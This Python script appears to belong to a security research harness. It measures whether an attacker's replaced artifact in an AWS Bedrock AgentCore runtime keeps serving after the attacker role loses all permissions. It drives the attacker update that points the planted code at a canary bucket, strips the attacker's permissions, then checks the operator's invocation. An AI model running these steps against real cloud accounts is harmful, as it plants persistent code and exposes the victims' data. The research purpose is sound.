#!/usr/bin/env python3
"""The ninth cell: does the takeover outlive the attacker's access.

The other cells end while the attacker still holds its permissions. That
leaves open the objection that this path buys nothing over the published one,
which reads a runtime's credentials with a single permission. The answer is
that the two differ in what remains afterwards, and this cell measures that
rather than asserting it.

The experiment:

  1. read the target runtime back and confirm it carries the planted artifact
  2. strip the attacker of every permission it holds, attached and inline
  3. confirm the attacker is now denied the update and cannot read the canary
  4. invoke the target through its ordinary endpoint, as the operator
  5. see whether the planted code still answers

A credential read does not survive step 2. A replaced artifact does, because
it is the deployment now. The verdict is `persists` only when the attacker
has nothing left and the operator's own call still returns the attacker's
marker.

The attacker's permissions are restored at the end so the other cells still
run, unless --leave-evicted is given.

  python3 persistence.py                 # after treatment or name-condition
  python3 persistence.py --leave-evicted
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
import uuid

import boto3
from botocore.exceptions import ClientError

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from exploit import (  # noqa: E402
    CANARY_KEY, PREFIX, attacker_policies, attacker_session, attempt_update,
    discover, runtime_arn, runtime_state, simulate_canary, stamp,
)

MARK = "planted-by-attacker"

PLANTED = "code/planted.zip"


def evict(env):
    """Take every permission off the attacker role, and say what was taken."""
    iam = boto3.client("iam")
    name = f"{PREFIX}{env['suffix']}-attacker"
    held = attacker_policies(env)
    for arn in held["attached"]:
        iam.detach_role_policy(RoleName=name, PolicyArn=arn)
    for pol in held["inline"]:
        iam.delete_role_policy(RoleName=name, PolicyName=pol)
    return held


def restore(env, held):
    """Put back exactly what evict took, so the other cells still run."""
    iam = boto3.client("iam")
    name = f"{PREFIX}{env['suffix']}-attacker"
    for arn in held["attached"]:
        try:
            iam.attach_role_policy(RoleName=name, PolicyArn=arn)
        except ClientError:
            pass
    # Inline policy documents are not recoverable from their names alone. The
    # cells that need one create it themselves, so this reports rather than
    # guesses.
    return {"reattached": held["attached"], "inline_not_restored": held["inline"]}


def operator_invoke(env, arn):
    """Invoke the runtime the way its own callers do, as the operator."""
    rt = boto3.client("bedrock-agentcore", region_name=env["region"])
    r = rt.invoke_agent_runtime(
        agentRuntimeArn=arn,
        runtimeSessionId="apt-persist-" + uuid.uuid4().hex + uuid.uuid4().hex[:8],
        payload=json.dumps({"prompt": "report"}).encode())
    raw = r["response"].read() if hasattr(r.get("response"), "read") else r.get("response")
    return raw.decode("utf-8", "replace") if isinstance(raw, (bytes, bytearray)) else str(raw)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--region", default=os.environ.get("AWS_REGION", "us-east-1"))
    ap.add_argument("--leave-evicted", action="store_true",
                    help="do not restore the attacker's permissions")
    a = ap.parse_args()

    env = discover(a.region)
    ctl = boto3.client("bedrock-agentcore-control", region_name=a.region)

    # Which runtime was taken over depends on the cell that ran: the treatment
    # targets the plain sibling, the name-condition targets the one whose role
    # name matches the managed policy's pattern. Find the one carrying the
    # planted artifact instead of assuming either.
    carrying, states = None, {}
    for name, rid in sorted(env["runtimes"].items()):
        st = runtime_state(ctl, rid)
        states[name] = st
        if PLANTED in json.dumps(st):
            carrying = (name, rid, st)

    rec = {"cell": "persistence", "at": stamp(), "region": a.region,
           "account": env["account"],
           "question": "does the replaced artifact keep answering the "
                       "runtime's own callers after the attacker has no "
                       "permissions left",
           "expected": "persists", "steps": []}

    if carrying is None:
        rec["verdict"] = "precondition not met"
        rec["runtimes"] = {n: {"status": s.get("status"),
                               "artifact": s.get("artifact")}
                           for n, s in states.items()}
        rec["note"] = ("no runtime carries the planted artifact. Run the "
                       "treatment or the name-condition cell first; this "
                       "cell measures what survives, not the takeover")
        print(json.dumps(rec, indent=1))
        return 2

    tname, rid, before = carrying
    arn = before.get("arn") or runtime_arn(ctl, rid)
    exec_b = before.get("roleArn")
    rec["target_runtime"] = tname
    rec["target_role"] = exec_b
    rec["target_before"] = before
    rec["steps"].append({"step": "target_carries_the_planted_artifact",
                         "runtime": tname, "ok": True})

    # Point the planted code at the canary before the attacker loses access.
    # The agent takes its target from environment variables, which
    # UpdateAgentRuntime carries beside the artifact, so this is the same call
    # the takeover already made and not a new capability.
    net = before.get("network") or before.get("networkConfiguration")
    try:
        sess = attacker_session(env, "persistence-point")
        pointed = attempt_update(
            sess, env, rid, PLANTED, exec_b, net,
            envvars={"APT_BUCKET": env["bucket"], "APT_KEY": CANARY_KEY,
                     "APT_REGION": env["region"]})
        rec["steps"].append({"step": "attacker_points_the_planted_code_at_the_canary",
                             "outcome": pointed.get("outcome"),
                             "error_message": (pointed.get("error_message")
                                               or "")[:300]})
    except Exception as e:
        rec["steps"].append({"step": "attacker_points_the_planted_code_at_the_canary",
                             "outcome": "failed", "detail": repr(e)[:300]})

    # wait for the new version to be serving before anything is taken away
    for _ in range(30):
        st = runtime_state(ctl, rid)
        if st.get("status") == "READY":
            break
        time.sleep(5)
    rec["target_after_pointing"] = runtime_state(ctl, rid)

    held = evict(env)
    rec["attacker_permissions_removed"] = held
    rec["steps"].append({"step": "attacker_stripped_of_every_permission",
                         "removed": held})
    time.sleep(10)  # let the removal propagate before testing it

    try:
        sess = attacker_session(env, "persistence")
        after = attempt_update(sess, env, rid, PLANTED, exec_b, net)
        rec["steps"].append({"step": "attacker_tries_the_update_again",
                             "outcome": after.get("outcome"),
                             "denied_action": after.get("denied_action"),
                             "error_code": after.get("error_code"),
                             "error_message": (after.get("error_message")
                                               or "")[:300]})
        still_can_update = after.get("outcome") == "allowed"
        tested = after.get("outcome") in ("allowed", "denied")
    except Exception as e:
        rec["steps"].append({"step": "attacker_tries_the_update_again",
                             "outcome": "not tested",
                             "detail": repr(e)[:300]})
        still_can_update, tested = False, False

    attacker_arn = env["roles"][f"{PREFIX}{env['suffix']}-attacker"]
    rec["canary_reachable_by_attacker_directly"] = simulate_canary(env, attacker_arn)

    body = None
    try:
        body = operator_invoke(env, arn)
        rec["steps"].append({"step": "operator_invokes_the_runtime",
                             "ok": True, "response": body[:2000]})
    except ClientError as e:
        rec["steps"].append({"step": "operator_invokes_the_runtime",
                             "ok": False, "error": repr(e)[:300]})

    report = None
    if body:
        try:
            report = json.loads(body).get("response", {})
        except Exception:
            report = {"unparsed": body[:2000]}
    rec["agent_report"] = report
    canary = (report or {}).get("canary")
    planted_answered = (report or {}).get("mark") == MARK
    canary_returned = isinstance(canary, str) and canary.startswith("APT-")
    rec["planted_code_answered"] = planted_answered
    rec["canary_returned_after_eviction"] = canary_returned

    rec["verdict"] = (
        "attacker still has access" if still_can_update
        else "deny not tested" if not tested
        else "persists with the victim's data" if planted_answered and canary_returned
        else "persists" if planted_answered
        else "did not persist")
    rec["what_this_shows"] = (
        "the attacker holds nothing, cannot repeat the update and cannot read "
        "the canary, and the runtime's own caller still receives the planted "
        "code's answer. A credential read ends when the credential is no "
        "longer reachable; a replaced artifact is the deployment until "
        "someone compares it against what was meant to be there.")

    if not a.leave_evicted:
        rec["restored"] = restore(env, held)

    os.makedirs(os.path.join(HERE, "runs"), exist_ok=True)
    path = os.path.join(HERE, "runs", f"run-persistence-{stamp()}.json")
    with open(path, "w") as fh:
        json.dump(rec, fh, indent=1)
    print(json.dumps(rec, indent=1))
    print(f"\nwritten: {path}")
    return 0 if rec["verdict"].startswith("persists") else 1


if __name__ == "__main__":
    sys.exit(main())
